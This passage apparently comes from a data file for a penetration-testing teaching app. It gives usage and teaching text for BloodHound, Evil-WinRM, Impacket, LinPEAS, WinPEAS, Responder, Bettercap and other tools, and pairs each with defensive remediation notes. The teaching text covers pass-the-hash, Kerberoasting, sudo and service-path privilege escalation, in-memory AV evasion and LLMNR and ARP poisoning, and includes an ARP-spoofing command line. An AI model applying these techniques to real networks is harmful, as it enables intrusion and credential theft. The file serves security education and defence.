Find Shortest Paths to DA.teach: The killer feature. Mark your compromised accounts as Owned, then run this query. BloodHound shows every attack path. Focus on paths with the fewest hops.

Kerberoastable Accounts.label: Find Kerberoastable Users
Kerberoastable Accounts.desc: Find service accounts with SPNs that can be Kerberoasted.
Kerberoastable Accounts.example: In BloodHound GUI: Analysis → Find all Kerberoastable Users
Kerberoastable Accounts.teach: Kerberoastable accounts have SPNs — request their service tickets, extract, crack offline. Service accounts often have weak passwords and excessive privileges.

flags: bloodhound-python -u USER -p PASS -d DOMAIN -c All -ns DC_IP
Collect (Linux).desc: Collect AD data from Linux with credentials.

bloodhound.defend_notes: BloodHound's collection methods are detectable: LDAP queries for ACLs, SMB connections to enumerate local admin, and session collection generate logs. Enable advanced audit policies (Account Logon, DS Access). The attack paths BloodHound reveals are real misconfigurations — remediate them: remove excessive ACL rights, clean up group membership, implement least privilege. Review DCSync rights monthly.
mitre_techniques: T1069.002 - Permission Groups Discovery: Domain Groups

evil-winrm.name: Evil-WinRM
evil-winrm.description: Windows Remote Management shell for pentesting. Provides a fully functional PowerShell session with extra features: file upload/download, in-memory .NET assembly loading, Pass the Hash, Kerberos auth, and bypass for AMSI and logging.
evil-winrm.teach_intro: WinRM is Windows' built-in remote management protocol on port 5985/5986. Evil-WinRM connects to it and gives you a feature-rich shell. It's cleaner than a reverse Meterpreter session for interactive work — you get tab completion, history, and PowerShell's full power.

-i.label: Target IP
-i.teach: WinRM must be enabled on the target (it's on by default on Windows Server 2012+). Port 5985 (HTTP) or 5986 (HTTPS).

-u.label: Username
-u.teach: Any user with WinRM access works. Local admins, domain admins, and users in the Remote Management Users group.

-p.label: Password
-p.teach: Plaintext password authentication. If you have an NTLM hash instead, use -H for Pass the Hash.

-H.label: NT Hash (Pass the Hash)
-H.desc: Authenticate using NTLM hash instead of plaintext password.
-H.teach: Pass the Hash — no password needed! Dump the NTLM hash with mimikatz or secretsdump, pass it directly here. No cracking required.

-s.label: PS Scripts Path
-s.desc: Path to PowerShell scripts to load in memory.
-s.teach: Scripts are loaded into memory without touching disk. Invoke-Mimikatz, PowerView, AMSI bypass scripts — all available via tab completion.

-e.label: .NET Executables Path
-e.desc: Path to .NET executables to load via Invoke-Binary.
-e.teach: Load SharpHound, Rubeus, SafetyKatz entirely in memory using Invoke-Binary. Never touches disk — bypasses AV file scanning.

Pass the Hash.desc: Connect using NTLM hash — no password needed.

With Scripts.desc: Connect and load PS scripts in memory.

evil-winrm.defend_notes: Restrict WinRM access via firewall rules — only allow from specific management hosts. Monitor Event 4624 (logon type 3) and PowerShell ScriptBlock logging (Event 4104). Credential Guard blocks Pass the Hash. Enable PowerShell Constrained Language Mode to limit what attackers can do in a WinRM session. Log all WinRM connections in your SIEM.
mitre_techniques: T1021.006 - Remote Services: Windows Remote Management
T1550.002 - Use Alternate Authentication Material: Pass the Hash

impacket.name: Impacket
impacket.description: Python library and collection of tools for Windows protocol attacks. Key tools: secretsdump (dump hashes), psexec (remote shell), wmiexec (WMI shell), smbclient (browse shares), GetUserSPNs (Kerberoasting), GetNPUsers (AS-REP roasting).
impacket.teach_intro: Impacket is the go-to toolkit for Windows Active Directory attacks from Linux. No need to run anything on Windows — attack directly from Kali. secretsdump dumps hashes remotely, psexec gives shells, and Kerberoasting extracts crackable service account hashes without touching the DC.

secretsdump.label: Dump Secrets Remotely
secretsdump.desc: Remotely dump SAM/NTDS hashes via SMB without running anything on target.
secretsdump.teach: secretsdump connects via SMB, reads the SAM database remotely, and dumps all NTLM hashes. On a DC: dumps the entire NTDS.dit — every domain account hash.

psexec.label: PSExec Remote Shell
psexec.desc: Get an interactive shell via SMB service creation.
psexec.teach: psexec creates a temporary service on the target and gives you a SYSTEM shell. Very loud — creates services, writes files. Detected by AV/EDR but effective on legacy systems.

wmiexec.label: WMI Remote Shell
wmiexec.desc: Execute commands via WMI. Fileless and stealthier than psexec.
wmiexec.teach: WMI execution is semi-interactive and doesn't write files to disk. Much stealthier than psexec. Output comes back via SMB share.

GetUserSPNs.label: Kerberoasting
GetUserSPNs.desc: Request service tickets for accounts with SPNs and extract for offline cracking.
GetUserSPNs.teach: Kerberoasting: request a service ticket, extract the TGS hash, crack offline with hashcat -m 13100. Service accounts often have weak passwords and high privileges.

GetNPUsers.label: AS-REP Roasting
GetNPUsers.desc: Get crackable hashes for accounts with pre-auth disabled (no creds needed).
GetNPUsers.teach: AS-REP roasting requires NO credentials. Accounts with 'Do not require Kerberos preauthentication' return a crackable hash. Crack with hashcat -m 18200.

smbclient.label: SMB Client
smbclient.desc: Browse and interact with SMB shares from Linux.
smbclient.teach: Interactive SMB shell. List shares, download files, upload backdoors. Like FTP but for Windows file shares.

impacket.defend_notes: Kerberoasting is hard to prevent since requesting service tickets is normal. Mitigate by using Managed Service Accounts (MSAs) with auto-rotating passwords, or Group Managed Service Accounts (gMSAs). Monitor for excessive TGS requests (many tickets in short time) in Event 4769. AS-REP roasting prevention: require pre-authentication for all accounts (never enable 'Do not require Kerberos preauthentication').
mitre_techniques: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

linpeas.name: LinPEAS
linpeas.description: Linux Privilege Escalation Awesome Script. Automatically searches for privilege escalation vectors on Linux: SUID/SGID binaries, sudo misconfigs, writable paths, cron jobs, kernel exploits, interesting files, network info, and hundreds more checks.
linpeas.teach_intro: After getting a low-privilege shell, your goal is root. LinPEAS does the recon for you — it runs 300+ checks looking for every known Linux privesc vector. Color-coded output: red/yellow = high priority finding. Start at the red output and work your way down.

-a.label: All Checks (thorough)
-a.desc: Run all checks including slower network checks.
-a.teach: More thorough but slower. -a adds network enumeration and extra checks. Use when you have time and a stable shell.

-q.label: Quiet Mode
-q.desc: Don't show banner and don't ask questions.
-q.teach: Quieter output. Use when you want clean text for logging or when running via a script.

-o.label: Output to File
-o.desc: Save results to a file for later review.
-o.teach: Save output! LinPEAS results are your roadmap. Review offline without the time pressure of an active shell.

SUID.label: SUID Binaries
SUID.desc: Focus area: binaries with SUID bit set run as owner (often root).
SUID.teach: SUID binaries run as the file's owner regardless of who executes them. If root owns a SUID binary with a shell escape, you get root. Check GTFOBins for escape techniques.

Sudo.label: Sudo Misconfigs
Sudo.desc: Focus area: sudo rules that allow privesc.
Sudo.teach: sudo -l shows what you can run as root. 'NOPASSWD: /usr/bin/vim' → vim with :!bash = root shell. Check every allowed command on GTFOBins.

Cron.label: Cron Job Analysis
Cron.desc: Focus area: writable scripts run by root's crontab.
Cron.teach: If root runs a script you can write to, you own root. Check crontab entries and look for writable scripts or PATH components that you can hijack.

Full Run.desc: Thorough all-checks run, save to file.

One-Liner.desc: Fetch and run in one command.

linpeas.defend_notes: LinPEAS findings are actual vulnerabilities you must fix. Key remediations: audit SUID binaries (remove unnecessary SUID bits), review sudo rules (use specific paths, avoid NOPASSWD for interpreters), lock down cron job permissions (scripts should be root-owned and not world-writable), patch kernel CVEs, disable dangerous capabilities.
mitre_techniques: T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid

winpeas.name: WinPEAS
winpeas.description: Windows Privilege Escalation Awesome Script. Automates enumeration of Windows privesc vectors: service misconfigs, unquoted service paths, AlwaysInstallElevated, token privileges, auto-logon credentials, stored credentials, and registry checks.
winpeas.teach_intro: After landing on a Windows box as a low-priv user, WinPEAS finds your escalation path. It checks 200+ Windows-specific attack vectors. Color-coded like LinPEAS: red and yellow are your priorities. Common wins: SeImpersonatePrivilege (Potato attacks), unquoted service paths, weak service permissions.

systeminfo.label: System Information
systeminfo.teach: Missing patches = kernel/service exploits. Note the Windows build number and check against known unpatched CVEs.

servicesinfo.label: Services Enumeration
servicesinfo.teach: Unquoted service paths with spaces are a classic privesc: C:\Program Files\My App\service.exe — place malicious binary at C:\Program.exe and restart the service.

applicationsinfo.label: Applications
applicationsinfo.desc: List installed software and look for vulnerable versions.
applicationsinfo.teach: Old software versions = known exploits. Installed security software tells you what you're up against. DLL hijacking opportunities in software directories.

userinfo.label: User Info
userinfo.teach: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato). SeBackupPrivilege → read any file. SeDebugPrivilege → process injection.

Full Scan.desc: Run all WinPEAS checks (no args = everything).

winpeas.defend_notes: Fix the findings WinPEAS surfaces: use quoted paths in service configurations, review service permissions (never grant write to Everyone), disable AlwaysInstallElevated GPO, apply patches, restrict token privileges. Implement Windows Defender Application Control (WDAC) to prevent unauthorized executable runs. Regular vulnerability scanning catches these configurations.
mitre_techniques: T1548.002 - Abuse Elevation Control Mechanism: Bypass UAC

volatility3.name: Volatility 3
volatility3.description: The leading open-source memory forensics framework. Analyzes RAM dumps to extract: running processes, network connections, loaded DLLs, command history, encryption keys, passwords in memory, injected code, rootkits, and more.
volatility3.teach_intro: Memory forensics is like an X-ray of a running system at a moment in time. Every running process, open network connection, encryption key, and typed command exists in RAM. Volatility reads a memory dump (or live memory) and lets you query all of this data without running anything on the victim machine.

-f.label: Memory Image File
-f.teach: Memory dumps are taken with FTK Imager, WinPMem, or VM snapshot files. The .vmem file from VMware is directly readable by Volatility.

windows.pslist.label: Process List
windows.pslist.desc: List running processes from the process list.
windows.pslist.teach: Shows all running processes with PID, PPID, name, and timestamps. Look for unusual processes, unusual parents (cmd.exe spawned by Word = malware), and process names that mimic legit ones.

windows.pstree.label: Process Tree
windows.pstree.desc: Display processes in parent-child tree format.
windows.pstree.teach: Tree view reveals injection chains. powershell.exe under winword.exe is a macro payload. cmd.exe under explorer.exe is suspicious. Know the normal Windows process tree.

windows.netstat.label: Network Connections
windows.netstat.desc: List active and recent network connections.
windows.netstat.teach: Shows C2 connections even after the process closed the socket (sockets linger in memory). Maps process PID to network connections — identifies the C2 process.

windows.dlllist.label: DLL List
windows.dlllist.desc: List DLLs loaded by each process.
windows.dlllist.teach: Injected DLLs show up here. Unknown DLLs in system processes, DLLs loaded from temp directories, or DLLs with no path (reflective injection) are all red flags.

windows.cmdline.label: Command Lines
windows.cmdline.desc: Show command-line arguments for all processes.
windows.cmdline.teach: Reveals what commands were run to launch each process. Powershell.exe with base64 encoded arguments = encoded malware. certutil.exe downloading files is a classic LOLBin.

windows.malfind.label: Malware Finder
windows.malfind.desc: Find injected code and hidden processes using heuristics.
windows.malfind.teach: malfind looks for memory regions that are executable but not backed by a file — the signature of shellcode injection. Dumps suspicious regions for further analysis.

windows.hashdump.label: Dump Password Hashes
windows.hashdump.desc: Extract NTLM password hashes from memory.
windows.hashdump.teach: Like mimikatz but offline from a memory dump. Extracts SAM hashes from SYSTEM and SAM hive memory — crack with hashcat.

Triage.desc: Quick process list — first triage step.

Malware Hunt.desc: Hunt for injected code and hidden malware.

volatility3.defend_notes: Memory forensics is your best tool for detecting advanced threats that live only in RAM. Implement: regular memory dumps as part of your IR playbook, endpoint agents that capture memory on anomaly detection, and blue team training on interpreting Volatility output. EDR tools like CrowdStrike Falcon do live memory inspection automatically.
mitre_techniques: T1003.001 - OS Credential Dumping: LSASS Memory

autopsy.name: Autopsy
autopsy.description: Open-source digital forensics platform. Analyzes disk images, file systems, and mobile devices. Recovers deleted files, extracts artifacts (web history, emails, documents), timestamps, and builds timelines. Used by law enforcement and incident responders worldwide.
autopsy.teach_intro: Autopsy is the GUI layer over The Sleuth Kit. When you have a disk image from a compromised system, Autopsy carves through it to find deleted files, recover artifacts, and build a timeline of activity. It's used for both offensive intelligence gathering and defensive incident response.

File Recovery.label: Deleted File Recovery
File Recovery.desc: Recover deleted files from disk images.
File Recovery.example: Open case → Add data source → Enable file recovery module
File Recovery.teach: Files are 'deleted' but the data stays on disk until overwritten. Autopsy recovers them. Deleted malware, wiped logs, erased documents — all potentially recoverable.

Web Artifacts.label: Browser History
Web Artifacts.desc: Extract browser history, downloads, cookies, cached images.
Web Artifacts.example: Open case → Run Recent Activity module
Web Artifacts.teach: Browser artifacts reveal attacker research: what sites they visited before the attack, C2 infrastructure they accessed, tools they downloaded.

Timeline.label: Timeline Analysis
Timeline.desc: Build a chronological timeline of file system activity.
Timeline.teach: Timeline shows exactly when files were created, modified, and accessed. Correlate with attack timestamps to build the kill chain narrative.

Keyword Search.label: Keyword Search
Keyword Search.desc: Search disk image for specific strings: passwords, IPs, domains.
Keyword Search.example: Open case → Keyword Search → enter terms
Keyword Search.teach: Search for C2 domains, malware hashes, victim data, or keywords from the investigation. Even encrypted files often have metadata or strings that match.

Launch GUI.desc: Launch Autopsy GUI. Create new case via interface.

autopsy.defend_notes: Forensics is the defensive side — collect and preserve evidence. Implement: centralized logging before an incident, full disk encryption complicates recovery (good for defense, bad for offense), integrity monitoring to detect unauthorized changes, and incident response plans that include immediate disk imaging before remediation.

theHarvester.name: theHarvester
theHarvester.description: OSINT gathering tool for email addresses, subdomains, IPs, URLs, and employee names. Queries search engines (Google, Bing, DuckDuckGo), social media, Shodan, VirusTotal, and dozens more. Pre-engagement recon gold.
theHarvester.teach_intro: theHarvester searches public sources for information about a target organization. Before you touch a single system, you can find email addresses (for phishing), subdomains (attack surface), employee names (social engineering), and IP ranges. All completely passive and legal.

-d.label: Target Domain
-d.teach: Your target domain is the seed. theHarvester finds everything publicly associated with it — emails, subdomains, employee names.

-b.label: Data Sources
-b.desc: Which sources to query: google, bing, shodan, virustotal, all
-b.teach: 'all' queries every available source. Individual sources: shodan finds exposed services, virustotal finds subdomains, linkedin finds employees (for social engineering).

-l.label: Result Limit
-l.teach: More results = more complete picture. 500 is a good starting point. Increase for large organizations.

-f.label: Output File
-f.desc: Save results to HTML and XML: -f output_file
-f.teach: HTML output is readable, XML is machine-parseable. Always save — you'll reference these findings throughout the engagement.

-v.label: Verify Hosts
-v.desc: Verify found hosts via DNS resolution.
-v.teach: Resolves found subdomains to confirm they're live. Dead subdomains are less interesting than live ones.

Full OSINT.desc: Query all sources, save HTML/XML report.

Quick Sweep.desc: Fast sweep of most useful sources.

theHarvester.defend_notes: Passive OSINT is invisible to you — you cannot detect theHarvester queries since it hits public search engines, not your infrastructure. Reduce your exposure: implement email obfuscation, use private WHOIS registration, monitor LinkedIn for employee over-disclosure, and subscribe to breach notification services for your domain.

maltego.name: Maltego
maltego.description: Visual intelligence gathering and link analysis platform. Transforms data about organizations, people, domains, and infrastructure into interactive graph visualizations. Shows hidden relationships between data points. Industry standard for OSINT graph analysis.
maltego.teach_intro: Maltego builds a visual graph of connections. Start with a domain → transforms find associated IPs, email addresses, people → those people have social media → their connections reveal other targets. It's like Palantir but for pentesters. The graph view makes complex relationships obvious at a glance.

Transforms.label: Run Transforms
Transforms.desc: Automated OSINT lookups called transforms. Right-click any node to run transforms against it.
Transforms.example: Right-click domain → Run Transform → DNS from Domain
Transforms.teach: Each transform queries a different data source and adds new nodes to the graph. Chain transforms: domain → subdomains → IPs → ASN → other domains on same ASN.

Machine.label: Machine Mode
Machine.desc: Automated transform chains that run multiple queries sequentially.
Machine.example: Machines tab → Company Stalker → enter target domain
Machine.teach: Machines are automated investigation workflows. 'Company Stalker' finds email addresses, people, and social profiles automatically. 'Footprint L1' does basic infrastructure mapping.

Launch GUI.desc: Launch Maltego CE GUI. Free version available with registration.

maltego.defend_notes: Like theHarvester, Maltego queries are passive and invisible. Defense is reducing your information footprint in public databases: private WHOIS, minimal LinkedIn disclosure, monitoring for leaked credentials in paste sites (HaveIBeenPwned Enterprise), and certificate transparency monitoring.

shodan.name: Shodan CLI
shodan.description: Command-line interface for Shodan — the search engine for internet-connected devices. Finds exposed services, default credentials, vulnerable software versions, industrial control systems, cameras, databases, and more. Essential for external attack surface mapping.
shodan.teach_intro: Shodan continuously scans the entire internet and indexes what it finds. You search it like Google but for devices. 'org:TargetCorp port:3389' finds all of their RDP servers. 'hostname:target.com vuln:CVE-2021-44228' finds their Log4j-vulnerable hosts. It's the fastest way to understand an organization's external exposure.

search.label: Search Shodan
search.desc: Query the Shodan database with filters.
search.teach: Powerful filters: org: (company name), hostname:, port:, os:, product:, version:, country:, vuln: (by CVE). Combine them: 'org:Target Corp port:3389 os:Windows'

host.label: Host Lookup
host.desc: Get all Shodan data for a specific IP.
host.teach: Shows every open port, service banner, vulnerabilities, and historical data Shodan has for an IP. Like a passive nmap from Shodan's perspective.

stats.label: Statistics
stats.teach: See which countries target's servers are in, which ports are most common, what OS versions they run. Great for understanding the overall infrastructure.

download.label: Download Results
download.desc: Download search results to a file.
download.example: shodan download results 'org:Target Corp' && shodan parse results.json.gz
download.teach: Download all matching hosts for offline analysis. Parse with shodan parse to extract IPs, ports, and banners.

myip.label: My IP Address
myip.desc: Show your current external IP address.
myip.teach: Quick check of what IP you're appearing as externally. Important for engagement tracking and for verifying VPN/proxy is working.

Org Search.desc: Find all Shodan data for an organization.

Port Scan.desc: Extract all open ports for a domain's hosts.

RDP Hunt.desc: Find exposed RDP servers for an org.

shodan.defend_notes: Shodan shows your true internet-facing exposure. Run 'shodan search org:YourCompany' from the defender side regularly — you'll find shadow IT, forgotten servers, and misconfigured services. Use Shodan Monitor to get alerts when new assets appear. Remove unnecessary internet-facing services, use VPNs for admin access instead of exposing RDP/SSH.
mitre_techniques: T1596.005 - Search Open Technical Databases: Scan Databases
T1590.005 - Gather Victim Network Information: IP Addresses

responder.name: Responder
responder.description: LLMNR/NBT-NS/mDNS poisoning tool for credential capture on local networks. When Windows systems fail DNS, they broadcast LLMNR requests — Responder answers them, captures NTLMv2 hashes, and cracks them offline. Also runs rogue SMB, HTTP, FTP, and other servers to capture auth attempts.
responder.teach_intro: Windows fails a DNS lookup → broadcasts LLMNR on the local network asking 'who has this name?' → Responder answers 'that's me!' → Windows sends NTLMv2 credentials to authenticate. You capture the NTLMv2 hash and crack it offline. In corporate environments this produces credentials within minutes of running.

-I.label: Network Interface
-I.desc: Interface to listen on: -I eth0 or -I wlan0
-I.teach: Responder listens on your interface and responds to broadcast queries. Must be on the same network segment as victims.

-r.label: Enable NBNS
-r.teach: NBNS is another Windows name resolution fallback. Combined with LLMNR poisoning you capture more hashes.

-d.label: Enable DHCP
-d.desc: Enable DHCP poisoning to inject Responder's IP as WPAD proxy.
-d.teach: DHCP poisoning injects WPAD configuration pointing to Responder's HTTP server. All browsers that auto-configure proxy send credentials.

-w.label: WPAD Server
-w.desc: Start a rogue WPAD proxy server.
-w.teach: WPAD (Web Proxy Auto-Discovery) tricks browsers into authenticating to your proxy. Transparent credential capture from browser traffic.

-P.label: Force NTLMv1
-P.desc: Force downgrade from NTLMv2 to NTLMv1 for easier cracking.
-P.teach: NTLMv1 is weaker and cracks much faster than NTLMv2. Some systems accept downgrade, others don't.

--lm.label: LM Downgrade
--lm.desc: Enable LM hash downgrade (very old systems).
--lm.teach: LM hashes are trivially crackable. Only older Windows systems (XP era) still use them, but some configs still negotiate LM.

Analyze Mode.desc: Analyze mode — listen but don't poison.

responder.defend_notes: Disable LLMNR and NBT-NS via Group Policy — this is the only real fix: Computer Config → Windows Settings → Security Settings → Local Policies → Security Options → 'Network Security: Allow LLMNR' = disabled. Use DNS for all name resolution. Enable SMB signing to prevent relay attacks. Monitor for multiple failed NTLM authentication events from new IPs on your network.

bettercap.name: Bettercap
bettercap.description: The Swiss Army knife of network attacks. Performs ARP spoofing, man-in-the-middle attacks, WiFi hacking, BLE (Bluetooth) sniffing, network discovery, and credential capture. Replaces ettercap with a modern modular architecture.
bettercap.teach_intro: Bettercap positions itself between you and network traffic (MITM). ARP poisoning tricks devices into sending traffic through you. Once in the middle, you see all unencrypted traffic, can inject content into HTTP pages, strip HTTPS (with SSLstrip), or capture credentials from protocols that use plaintext auth.

-iface.label: Network Interface
-iface.teach: Specifies your network interface. wlan0 for WiFi MITM, eth0 for wired. Bettercap starts an interactive console.

net.probe.label: Network Probe
net.probe.desc: Discover hosts on the network segment.
net.probe.teach: Sends ARP/mDNS/UPnP probes to discover all hosts. Shows IP, MAC, hostname, and vendor. Your target list.

arp.spoof.label: ARP Spoofing
arp.spoof.desc: Perform ARP poisoning to MITM traffic.
arp.spoof.teach: Tells victim 'the gateway is at MY MAC address'. All their traffic flows through you. Combine with net.sniff to capture it.

net.sniff.label: Network Sniffing
net.sniff.desc: Sniff and display/log captured network traffic.
net.sniff.teach: Captures and parses all traffic. Credentials from HTTP forms, FTP, POP3, IMAP, Telnet — all visible in cleartext.

https.proxy.label: HTTPS Proxy / SSLstrip
https.proxy.desc: Act as HTTPS proxy for SSL inspection and stripping.
https.proxy.teach: SSLstrip intercepts HTTPS redirects and serves HTTP instead. User thinks they're on HTTPS but you see plaintext. Modern HSTS protects most sites.

wifi.recon.label: WiFi Recon
wifi.recon.desc: Scan and monitor nearby WiFi networks.
wifi.recon.teach: Shows all APs and clients in range with signal strength, BSSID, encryption type. Foundation for WiFi attacks.

Host Discovery.desc: Discover all hosts on local network.

flags: 'set arp.spoof.targets TARGET_IP; arp.spoof on; net.sniff on'

bettercap.defend_notes: Enable Dynamic ARP Inspection (DAI) on managed switches — prevents ARP spoofing at hardware level. Use 802.1X port authentication to verify device identity before network access. Encrypt everything (TLS 1.3). Enable HTTPS Strict Transport Security (HSTS) with preloading to prevent SSL stripping. Deploy network IDS (Snort/Suricata) to detect ARP anomalies.

wpscan.name: WPScan
wpscan.description: Black box WordPress vulnerability scanner. Enumerates WordPress version, installed plugins, themes, users, and checks them all against a database of known vulnerabilities. The definitive tool for WordPress security assessment.
wpscan.teach_intro: WordPress powers 43% of the web. WPScan specifically targets the WordPress ecosystem — outdated plugins are the most common attack vector. A single vulnerable plugin can give you remote code execution regardless of how well the core WordPress installation is secured.

--url.label: Target URL
--url.teach: Give wpscan the WordPress URL. It auto-detects WordPress, version, and begins enumeration.

--enumerate.label: Enumerate
--enumerate.desc: What to enumerate: p=plugins, t=themes, u=users, vp=vulnerable plugins only.
--enumerate.teach: p finds all plugins (each is a potential vuln). u finds usernames for brute forcing. vp only shows vulnerable plugins — cleaner output.

--api-token.label: API Token
--api-token.desc: WPScan vulnerability database API token. Free at wpscan.com.
--api-token.teach: The API token unlocks vulnerability data. Without it you see plugins/themes but not which ones are vulnerable. Free 25 API calls/day with registration.

--passwords.label: Password File
--passwords.teach: If you found admin username via enumeration, brute force the wp-login.php endpoint. WordPress doesn't rate-limit by default.

--usernames.label: Username(s)
--usernames.teach: Use usernames found during --enumerate u. Author archives reveal usernames. xmlrpc.php also exposes them.

-t.label: Threads
-t.teach: More threads = faster but more detectable. Default 5 is safe. Plugin enumeration with many threads completes much faster.

Full Enum.desc: Full WordPress enumeration with vuln data.

wpscan.defend_notes: Keep WordPress core, plugins, and themes updated — this eliminates 95% of WPScan findings. Install a security plugin (Wordfence, Sucuri) for firewall and login protection. Change login URL from /wp-login.php (stops automated attacks). Implement 2FA for all admin accounts. Limit login attempts. Use Managed WordPress hosting with auto-updates.

searchsploit.name: SearchSploit
searchsploit.description: Offline command-line search tool for the Exploit-DB database. Contains 45,000+ exploits for every platform and software version. Find public exploits for any software version without internet access. Links directly to downloadable exploit code.
searchsploit.teach_intro: After nmap discovers 'Apache 2.4.29' or 'OpenSSH 7.4', searchsploit tells you what public exploits exist for that exact version. It searches the offline copy of Exploit-DB — the internet's largest database of known exploits — and gives you the exact file to use.

-t.label: Title Search Only
-t.desc: Search only in exploit title, not description.
-t.teach: Title-only search reduces false positives. 'searchsploit apache' returns thousands. 'searchsploit -t apache 2.4' narrows to the version.

-e.label: Exact Match
-e.teach: Exact matching for precise version strings from nmap output. Copy the service/version string from nmap -sV and paste it.

-x.label: View Exploit Code
-x.desc: Read exploit source code directly in terminal.
-x.teach: Always read exploit code before running it. Understand what it does, what requirements it has, and whether it's stable or a PoC that might crash the service.

-m.label: Copy Exploit
-m.desc: Mirror exploit file to current directory.
-m.teach: Copies the exploit to your working directory so you can modify it. Always copy before editing — don't modify the database original.

--cve.label: Search by CVE
--cve.desc: Find exploits for a specific CVE number.
--cve.teach: Found a CVE in a Nuclei or Nessus scan? searchsploit --cve gives you the public PoC exploit code immediately.

-u.label: Update Database
-u.teach: Run monthly to keep your local DB current. New exploits are added daily to Exploit-DB. Fresh = more hits.

Service Search.desc: Search for exploits by service name/version.

CVE Lookup.desc: Find exploits for a specific CVE.

searchsploit.defend_notes: Searchsploit shows you what attackers know about your software. The fix is always patching — every searchsploit result should be in your patch list. Subscribe to vendor security advisories. Run authenticated Nessus/OpenVAS scans monthly to find vulnerable versions before attackers do. Software inventory management (CMDB) is prerequisite to patch management.

binwalk.name: Binwalk
binwalk.description: Firmware analysis and extraction tool. Identifies embedded file systems, compressed data, bootloaders, encryption, and executable code within binary firmware images. Essential for IoT security research and CTF firmware analysis challenges.
binwalk.teach_intro: Firmware from IoT devices, routers, and embedded systems often contains Linux file systems, configuration files, and hardcoded credentials compressed inside a single binary blob. Binwalk finds and extracts all of it — revealing the actual operating system, user accounts, and running services.

-e.label: Extract
-e.teach: The most useful flag — extracts everything binwalk finds. Creates a _firmware.bin.extracted/ directory with all recovered files. Look for /etc/passwd, config files, and binaries.

-E.label: Entropy Analysis
-E.desc: Calculate entropy to identify compressed/encrypted regions.
-E.teach: High entropy = compressed or encrypted data. Low entropy = plaintext/code. Entropy graph reveals the structure of the firmware at a glance.

-A.label: Opcode Scan
-A.desc: Scan for common executable opcodes to identify CPU architecture.
-A.teach: Unknown firmware? -A identifies the CPU architecture (MIPS, ARM, x86). Guides your disassembly setup.

-D.label: Extract by Type
-D.teach: Extract specific file types when you know what you're looking for. Pulls all JPEG images, all certificate files, or all ELF binaries.

Full Extract.desc: Extract all embedded files and filesystems.

Entropy Map.desc: Visualize entropy to understand firmware structure.

binwalk.defend_notes: Firmware security: encrypt firmware images and verify signatures before flashing. Hardcoded credentials (common in IoT firmware) should be eliminated — use device-unique credentials generated at manufacture. Secure boot prevents execution of unsigned firmware. Implement a firmware update process that allows pushing security fixes rapidly.

gdb.name: GDB with PEDA/GEF
gdb.description: GNU Debugger enhanced with PEDA or GEF (GDB Enhanced Features) for exploit development. Analyzes program execution, finds memory corruption vulnerabilities, develops buffer overflow exploits, and reverse engineers binaries. Core tool for binary exploitation and CTF challenges.
gdb.teach_intro: GDB lets you run a program in slow motion — pause execution, inspect memory and registers, step through instructions, and understand exactly what happens during a crash. Buffer overflows, format string vulnerabilities, and heap exploits are all found and exploited using GDB. GEF adds color, pattern generation, and exploit-development commands.

pattern create.label: Cyclic Pattern (GEF)
pattern create.desc: Generate De Bruijn sequence to find buffer overflow offset.
pattern create.teach: Creates a unique 200-char pattern. Put in the input, crash the program, read the value in RIP/EIP, then 'pattern offset VALUE' tells you exactly how many bytes until the return address.

checksec.label: Security Checks
checksec.desc: Show enabled exploit mitigations: ASLR, NX, Stack Canary, PIE, RELRO.
checksec.teach: Before exploiting: know your defenses. NX means no shellcode in stack. PIE means addresses are randomized. No canary = easier stack overflow. No PIE = fixed addresses.

run.label: Run Program
run.desc: Execute the target binary inside GDB.
run.teach: Start the program. With a crash it shows the instruction pointer value — the foundation of understanding the overflow.

info registers.label: View Registers
info registers.desc: Show current register values (RIP, RSP, RBP, etc.)
info registers.teach: After a crash: what's in RIP? That's your target. RSP points to the stack. Understanding registers is the foundation of exploit development.

x/20wx $rsp.label: Examine Stack
x/20wx $rsp.desc: Examine 20 words from the stack pointer.
x/20wx $rsp.teach: Shows what's on the stack right now. Find your pattern, shellcode, or gadgets here. x/s $rsp for strings, x/i $rip for instructions.

b *address.label: Set Breakpoint
b *address.desc: Set breakpoint at specific memory address or function.
b *address.teach: Pause execution at interesting points. Before the vulnerable function to see input. After strcpy to see overflow. At the return to verify control.

With GEF.desc: Start GDB with GEF, generate cyclic pattern.

gdb.defend_notes: Enable all compiler/OS mitigations: ASLR (enabled by default on Linux), stack canaries (-fstack-protector-all), NX bit (W^X policy), PIE (-fPIE -pie), RELRO (-Wl,-z,relro,-z,now). Use modern memory-safe languages (Rust, Go) where possible. Static analysis tools (CodeQL, Semgrep) catch vulnerable patterns in code before they reach production.

radare2.name: Radare2
radare2.description: Open-source reverse engineering framework. Disassembles, debugs, analyzes, and patches binaries for any architecture. Supports x86/x64, ARM, MIPS, PowerPC, and more. The free alternative to IDA Pro and Ghidra for binary analysis.
radare2.teach_intro: Radare2 lets you take apart compiled programs and understand what they do without source code. Malware analysis, CTF binary challenges, vulnerability research — all done in r2. The command syntax is cryptic but incredibly powerful once learned. aa = analyze all, pdf = print disassembly of function.

-A.label: Analyze on Open
-A.desc: Run full analysis when opening binary.
-A.teach: Full auto-analysis finds functions, strings, cross-references. Equivalent to typing 'aaa' after opening. Always use -A for a clean start.

-d.label: Debug Mode
-d.teach: Debug mode lets you run the binary, set breakpoints, and inspect memory. Use for dynamic analysis.

aaa.label: Deep Analysis
aaa.desc: Run all analysis passes: functions, symbols, xrefs.
aaa.teach: aaa finds all functions, resolves imports, and builds the call graph. Takes longer than aa but gives complete picture.

pdf.label: Print Disassembly
pdf.desc: Print disassembly of current function: pdf @ main
pdf.teach: Shows assembly of a function. pdf @ sym.vulnerable_function shows the function you're targeting. Start with main, follow calls.

iz.label: List Strings
iz.desc: List all strings found in the binary.
iz.teach: Strings reveal hardcoded credentials, URLs, C2 domains, flag hints in CTFs. One of the first things to run on any binary.

afl.label: List Functions
afl.teach: After analysis, afl shows every function. grep for: main, vuln, login, check, admin, flag. Start your analysis from interesting function names.

radare2.defend_notes: Code obfuscation and anti-debugging techniques slow reverse engineering but don't stop determined analysts. For malware defense: behavioral analysis catches obfuscated malware better than signature AV. Application whitelisting prevents unauthorized binaries from running. For developers: strip production binaries, use obfuscation tools, implement license checks that resist tampering.

ghidra.name: Ghidra
ghidra.description: NSA-developed open-source reverse engineering suite with decompiler. Converts compiled binaries back into readable C-like pseudocode. Supports x86, ARM, MIPS, PowerPC, and more. Free alternative to IDA Pro that rivals its decompilation quality.
